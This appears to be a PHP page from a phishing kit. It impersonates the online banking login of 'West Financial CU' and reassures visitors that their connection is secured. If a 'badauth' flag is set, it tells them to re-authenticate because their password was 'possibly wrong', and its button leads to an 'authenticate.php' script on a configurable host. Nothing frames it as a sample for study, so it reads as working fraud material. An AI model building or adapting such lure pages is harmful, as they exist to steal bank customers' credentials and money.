<?php
    require_once "./config.php";

    include './_index.php';
    $indexPage = ob_get_contents();
    ob_end_clean();

    $index64 = base64_encode($indexPage);
  ?>
<html>
<head>
  <title>
        West Financial CU: Online Banking

  </title>
  <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.0.0/jquery.min.js"></script>
  <link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
  <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>

  <style type="text/css">
    <?php echo file_get_contents('index.css');?>
  </style>
</head>

<body>
  <div class="container">
    <div class="col-sm-12">
                <div class="bs-calltoaction bs-calltoaction-default">
                    <div class="row">
                        <div class="col-md-9 cta-contents">
                          <?php
                            if (isset($_GET['badauth'])) {
                              echo '<h1 class="cta-title">Session re-authentication required.</h1> <h3>Possibly wrong password</h3>';
                            } else {
                              echo '<h1 class="cta-title">Your connection is secured</h1>';
                            }
                          ?>

                            <div class="cta-desc">
                                <p><b>Opera Browser Preffered</b></p>
                                <p>Secured transactions</p>
                                <p>Great support service.</p>
                            </div>
                        </div>
                        <div class="col-md-3 cta-button">
                        <a class="btn btn-lg btn-block btn-primary" href="<?php echo "$host/authenticate.php"; ?>">Click Here to begin</a>
                        </div>
                     </div>
                </div>
    </div>
  </div>
</body>
</html>
